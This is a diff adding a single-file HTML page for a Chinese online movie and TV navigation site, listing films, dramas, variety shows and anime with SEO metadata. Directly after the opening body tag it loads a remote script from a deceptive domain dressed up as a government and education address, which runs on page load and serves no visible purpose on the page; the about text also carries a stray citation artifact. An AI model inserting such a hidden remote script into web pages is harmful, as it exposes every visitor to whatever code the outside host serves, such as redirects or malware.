@@ -1,0 +1,224 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>秋霞电影网在线播放 - 在线电影/热播剧集/综艺动漫导航</title>
+<meta name="description" content="秋霞电影网在线播放(qiuxiadianyingwangzaixianbofang-h5.github.io)整理可在线观看的影视信息：在线电影、热播剧集、热门综艺、动漫新番，移动端自适应，单文件影视导航站。">
+<meta name="keywords" content="秋霞电影网在线播放,在线电影,热播剧集,热门综艺,动漫新番,影视导航">
+<meta name="author" content="秋霞电影网在线播放">
+<meta name="robots" content="index, follow">
+<meta property="og:title" content="秋霞电影网在线播放 - 晚霞放映厅">
+<meta property="og:description" content="秋霞电影网在线播放整理在线电影、热播剧集、热门综艺、动漫新番片单。">
+<meta property="og:type" content="website">
+<meta property="og:url" content="https://qiuxiadianyingwangzaixianbofang-h5.github.io">
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+html{font-size:16px;scroll-behavior:smooth}
+body{font-family:'PingFang SC','Microsoft YaHei',sans-serif;background:#1a1426;color:#f6efe7;line-height:1.7;overflow-x:hidden}
+a{text-decoration:none;color:inherit}
+ul{list-style:none}
+
+/* 晚霞顶栏 */
+.dusk-bar{position:sticky;top:0;z-index:999;background:linear-gradient(180deg,rgba(26,20,38,.98),rgba(26,20,38,.92));border-bottom:1px solid #3a2a3f;padding:.6rem .9rem}
+.dusk-top{display:flex;align-items:center;justify-content:space-between}
+.brand{font-size:1.06rem;font-weight:900}
+.brand b{color:#ff7a45;text-shadow:0 0 10px rgba(255,122,69,.45)}
+.brand i{color:#ffb38a;font-style:normal}
+.sky{font-size:.7rem;color:#caa6b8}
+.sky b{color:#ffd9c2}
+.horizon{height:5px;background:linear-gradient(90deg,#ff7a45,#c0392b,#7a4b8a,#1a1426);border-radius:3px;margin-top:.5rem}
+.leaves{display:flex;gap:.32rem;margin-top:.55rem;overflow-x:auto}
+.leaves a{font-size:.74rem;padding:.32rem .72rem;white-space:nowrap;border-radius:14px 6px 14px 6px;border:1px solid #3a2a3f;color:#e7c9d8;transition:.25s}
+.leaves a.active,.leaves a:hover{background:linear-gradient(135deg,#ff7a45,#c0392b);color:#1a1426;font-weight:700;border-color:transparent}
+
+.wrap{padding:1rem;max-width:1100px;margin:0 auto}
+.scene{display:none;animation:fade 0.4s ease}
+.scene.active{display:block}
+@keyframes fade{from{opacity:0;transform:translateY(10px)}to{opacity:1;transform:none}}
+.scene h2{font-size:1.22rem;color:#ff7a45;margin:0 0 1rem;padding-left:.5rem;border-left:4px solid #c0392b}
+
+/* 首页 */
+#home .sunset{background:radial-gradient(120% 130% at 80% 0%,#c0392b33,#1a1426 60%),radial-gradient(80% 80% at 20% 100%,#ff7a4522,#1a1426);border:1px solid #3a2a3f;border-radius:20px 20px 8px 8px;padding:1.7rem 1.5rem;margin-bottom:1rem;position:relative;overflow:hidden}
+#home .sunset:before{content:"🌇";position:absolute;right:6px;top:-10px;font-size:6rem;opacity:.12}
+#home .sunset h1{font-size:1.68rem;color:#ffd9c2;margin-bottom:.4rem}
+#home .sunset h1 span{color:#ff7a45}
+#home .sunset p{font-size:.86rem;color:#e7c9d8}
+.play-kpi{display:grid;grid-template-columns:repeat(4,1fr);gap:.7rem;margin-top:1rem}
+.play-kpi div{background:#241a2e;border:1px solid #3a2a3f;border-radius:12px;padding:.9rem;text-align:center}
+.play-kpi h3{color:#ff7a45;font-size:.98rem}
+.play-kpi p{font-size:.66rem;color:#a98bab}
+
+/* 电影霞光卡 */
+.film-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(165px,1fr));gap:.85rem}
+.film{background:#241a2e;border:1px solid #3a2a3f;border-radius:14px;overflow:hidden;position:relative;transition:.25s}
+.film:hover{transform:translateY(-4px);box-shadow:0 10px 26px rgba(255,122,69,.22);border-color:#ff7a45}
+.film .glow{height:116px;display:flex;align-items:flex-end;padding:.7rem;font-weight:800;font-size:.8rem;color:#1a1426}
+.film .g1{background:linear-gradient(135deg,#ff7a45,#ffd166)}
+.film .g2{background:linear-gradient(135deg,#c0392b,#7a1f2b)}
+.film .g3{background:linear-gradient(135deg,#7a4b8a,#3a2a3f);color:#f6efe7}
+.film .g4{background:linear-gradient(135deg,#ffb38a,#ff7a45)}
+.film .meta{padding:.65rem}
+.film h3{font-size:.84rem;color:#fff}
+.film .row{display:flex;justify-content:space-between;font-size:.7rem;color:#a98bab}
+.film .rate{color:#ffd166;font-weight:700}
+.film .play{position:absolute;top:8px;left:8px;background:#1a1426cc;color:#ff7a45;font-size:.62rem;padding:.18rem .45rem;border-radius:20px;font-weight:700;border:1px solid #ff7a45}
+
+/* 剧集落日条 */
+.ep-list{display:flex;flex-direction:column;gap:.8rem}
+.ep{display:flex;gap:.85rem;background:#241a2e;border:1px solid #3a2a3f;border-left:4px solid #ff7a45;border-radius:12px;padding:.9rem}
+.ep .dot{width:40px;height:40px;border-radius:50%;flex-shrink:0;display:flex;align-items:center;justify-content:center;font-size:1.1rem;background:linear-gradient(135deg,#ff7a45,#c0392b)}
+.ep h3{font-size:.92rem;color:#fff}
+.ep p{font-size:.74rem;color:#e7c9d8}
+.ep .prog{height:6px;background:#3a2a3f;border-radius:4px;margin-top:.5rem;overflow:hidden}
+.ep .prog i{display:block;height:100%;background:linear-gradient(90deg,#ffd166,#ff7a45)}
+
+/* 综艺篝火 */
+.fire-reel{display:flex;gap:.65rem;overflow-x:auto;padding-bottom:.4rem}
+.fire-reel::-webkit-scrollbar{height:5px}.fire-reel::-webkit-scrollbar-thumb{background:#3a2a3f;border-radius:5px}
+.fire{min-width:162px;background:#241a2e;border:1px solid #3a2a3f;border-radius:12px;padding:.9rem;text-align:center}
+.fire .e{font-size:1.5rem}
+.fire h3{font-size:.84rem;color:#ff7a45;margin:.3rem 0 .15rem}
+.fire p{font-size:.7rem;color:#a98bab}
+
+/* 动漫 */
+.anime-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(150px,1fr));gap:.8rem}
+.anime{background:#241a2e;border:1px solid #3a2a3f;border-radius:12px;overflow:hidden}
+.anime .tile{height:96px;display:flex;align-items:center;justify-content:center;font-weight:800;font-size:.78rem;color:#1a1426}
+.anime .t1{background:linear-gradient(135deg,#ff7a45,#ffd166)}
+.anime .t2{background:linear-gradient(135deg,#c0392b,#7a4b8a);color:#f6efe7}
+.anime .t3{background:linear-gradient(135deg,#7a4b8a,#ffb38a)}
+.anime .body{padding:.55rem}
+.anime h3{font-size:.8rem;color:#fff}
+.anime span{font-size:.66rem;color:#a98bab}
+
+/* 关于 */
+.about-dusk{background:radial-gradient(120% 120% at 80% 20%,#3a2a3f,#1a1426);border:1px solid #ff7a45;border-radius:18px;padding:1.5rem}
+.about-dusk h2{color:#ff7a45;border:0;padding:0;margin-bottom:.8rem}
+.about-dusk p{font-size:.85rem;color:#e7c9d8;margin-bottom:.6rem}
+.about-dusk .info{margin-top:1rem;background:#241a2e;border:1px dashed #c0392b;border-radius:12px;padding:1rem}
+.about-dusk .info h3{color:#ffb38a;margin-bottom:.4rem}
+.about-dusk .info p{font-size:.78rem;color:#a98bab}
+
+.foot{text-align:center;padding:1.4rem 1rem;border-top:1px solid #3a2a3f;margin-top:1.6rem;font-size:.72rem;color:#6b5570}
+@media(max-width:768px){.play-kpi{grid-template-columns:repeat(2,1fr)}.film-grid{grid-template-columns:1fr 1fr}.brand{font-size:.94rem}#home .sunset h1{font-size:1.36rem}}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/laoliu.js"></script>
+
+<header class="dusk-bar">
+  <div class="dusk-top">
+    <div class="brand">秋霞<b>电影网在线播放</b> <i>🌇</i></div>
+    <div class="sky">时段 <b>18:47</b> · 晚霞放映</div>
+  </div>
+  <div class="horizon"></div>
+  <nav class="leaves">
+    <a href="#" class="lf active" data-s="home">秋霞首页</a>
+    <a href="#" class="lf" data-s="movie">在线电影</a>
+    <a href="#" class="lf" data-s="drama">热播剧集</a>
+    <a href="#" class="lf" data-s="show">热门综艺</a>
+    <a href="#" class="lf" data-s="anime">动漫新番</a>
+    <a href="#" class="lf" data-s="about">关于</a>
+  </nav>
+</header>
+
+<main class="wrap">
+
+  <section id="home" class="scene active">
+    <div class="sunset">
+      <h1>秋霞电影网<span>在线播放</span></h1>
+      <p>傍晚打开，像看一场晚霞：在线电影、热播剧集、综艺、动漫，挑好片直接进“播放导航”。</p>
+      <div class="play-kpi">
+        <div><h3>在线</h3><p>电影/剧集/番剧</p></div>
+        <div><h3>高清</h3><p>1080P / 修复版</p></div>
+        <div><h3>跟更</h3><p>剧集每日更新</p></div>
+        <div><h3>移动</h3><p>手机平板自适应</p></div>
+      </div>
+    </div>
+  </section>
+
+  <section id="movie" class="scene">
+    <h2>🎬 在线电影 · 霞光海报</h2>
+    <div class="film-grid">
+      <div class="film"><div class="play">▶ 播放</div><div class="glow g1">星际穿越</div><div class="meta"><h3>星际穿越</h3><div class="row"><span>科幻 / 2014</span><span class="rate">9.4</span></div></div></div>
+      <div class="film"><div class="play">▶ 播放</div><div class="glow g2">霸王别姬</div><div class="meta"><h3>霸王别姬</h3><div class="row"><span>剧情 / 1993</span><span class="rate">9.8</span></div></div></div>
+      <div class="film"><div class="play">▶ 播放</div><div class="glow g3">漫长的季节</div><div class="meta"><h3>漫长的季节</h3><div class="row"><span>悬疑 / 2023</span><span class="rate">9.5</span></div></div></div>
+      <div class="film"><div class="play">▶ 播放</div><div class="glow g4">热辣滚烫</div><div class="meta"><h3>热辣滚烫</h3><div class="row"><span>喜剧 / 2024</span><span class="rate">8.2</span></div></div></div>
+      <div class="film"><div class="play">▶ 播放</div><div class="glow g1">流浪地球2</div><div class="meta"><h3>流浪地球2</h3><div class="row"><span>科幻 / 2023</span><span class="rate">9.1</span></div></div></div>
+      <div class="film"><div class="play">▶ 播放</div><div class="glow g2">无间道</div><div class="meta"><h3>无间道</h3><div class="row"><span>犯罪 / 2002</span><span class="rate">9.3</span></div></div></div>
+    </div>
+  </section>
+
+  <section id="drama" class="scene">
+    <h2>📺 热播剧集 · 落日连播</h2>
+    <div class="ep-list">
+      <div class="ep"><div class="dot">🍁</div><div><h3>繁花</h3><p>都市年代剧 · 全30集 · 在线连播</p><div class="prog"><i style="width:100%"></i></div></div></div>
+      <div class="ep"><div class="dot">🌆</div><div><h3>庆余年2</h3><p>古装权谋 · 更新至18集</p><div class="prog"><i style="width:36%"></i></div></div></div>
+      <div class="ep"><div class="dot">🍂</div><div><h3>狂飙</h3><p>扫黑除恶 · 全39集</p><div class="prog"><i style="width:100%"></i></div></div></div>
+      <div class="ep"><div class="dot">🌇</div><div><h3>唐朝诡事录2</h3><p>悬疑古装 · 全40集</p><div class="prog"><i style="width:100%"></i></div></div></div>
+      <div class="ep"><div class="dot">🍁</div><div><h3>追风者</h3><p>民国谍战 · 全38集</p><div class="prog"><i style="width:100%"></i></div></div></div>
+    </div>
+  </section>
+
+  <section id="show" class="scene">
+    <h2>🎤 热门综艺 · 篝火横滑</h2>
+    <div class="fire-reel">
+      <div class="fire"><div class="e">🎙️</div><h3>歌手2024</h3><p>音乐竞演</p></div>
+      <div class="fire"><div class="e">🏃</div><h3>奔跑吧12</h3><p>户外竞技</p></div>
+      <div class="fire"><div class="e">🏡</div><h3>向往的生活7</h3><p>慢生活真人秀</p></div>
+      <div class="fire"><div class="e">🎭</div><h3>名侦探学院9</h3><p>推理社交</p></div>
+      <div class="fire"><div class="e">🌾</div><h3>种地吧2</h3><p>劳作纪实</p></div>
+    </div>
+  </section>
+
+  <section id="anime" class="scene">
+    <h2>🎨 动漫新番 · 番剧格子</h2>
+    <div class="anime-grid">
+      <div class="anime"><div class="tile t1">葬送的芙莉莲</div><div class="body"><h3>葬送的芙莉莲</h3><span>奇幻 / 28集</span></div></div>
+      <div class="anime"><div class="tile t2">咒术回战</div><div class="body"><h3>咒术回战</h3><span>热血 / 完结</span></div></div>
+      <div class="anime"><div class="tile t3">鬼灭之刃</div><div class="body"><h3>鬼灭之刃 柱训练篇</h3><span>热血 / 2024</span></div></div>
+      <div class="anime"><div class="tile t1">怪兽8号</div><div class="body"><h3>怪兽8号</h3><span>热血 / 12集</span></div></div>
+      <div class="anime"><div class="tile t2">迷宫饭</div><div class="body"><h3>迷宫饭</h3><span>奇幻 / 美食</span></div></div>
+      <div class="anime"><div class="tile t3">我独自升级</div><div class="body"><h3>我独自升级</h3><span>热血 / 12集</span></div></div>
+    </div>
+  </section>
+
+  <section id="about" class="scene">
+    <div class="about-dusk">
+      <h2>关于 秋霞电影网在线播放</h2>
+      <p>秋霞电影网在线播放是一个“晚霞放映厅”式影视导航站，整理可在线观看的影视信息：在线电影、热播剧集、热门综艺、动漫新番。</p>
+      <p>页面采用单文件 H5 结构，CSS/JS 全部内联，手机、平板、电脑一套代码自适应；标题、栏目、片单文字直接写在 HTML 里，方便必应等搜索引擎抓取。[2](@ref)</p>
+      <p>本站仅做影视信息展示与分类导航，“播放”按钮使用 # 占位，不提供盗版资源，也不生成 robots.txt / sitemap.xml。</p>
+      <div class="info">
+        <h3>站点信息</h3>
+        <p>网站名称：秋霞电影网在线播放</p>
+        <p>网址：https://qiuxiadianyingwangzaixianbofang-h5.github.io</p>
+        <p>关键词：秋霞电影网在线播放、在线电影、热播剧集、热门综艺、动漫新番</p>
+      </div>
+    </div>
+  </section>
+
+  <footer class="foot">
+    <p>© 2024 秋霞电影网在线播放 | https://qiuxiadianyingwangzaixianbofang-h5.github.io</p>
+    <p>本网站仅提供影视信息展示与分类导航，所有资源来自互联网，如有侵权请联系删除。</p>
+  </footer>
+</main>
+
+<script>
+var lf=document.querySelectorAll('.lf');
+lf.forEach(function(a){
+  a.addEventListener('click',function(e){
+    e.preventDefault();
+    var s=this.dataset.s;
+    document.querySelectorAll('.scene').forEach(function(x){x.classList.remove('active')});
+    document.getElementById(s).classList.add('active');
+    lf.forEach(function(x){x.classList.remove('active')});
+    this.classList.add('active');
+    window.scrollTo({top:0,behavior:'smooth'});
+  });
+});
+</script>
+</body>
+</html>
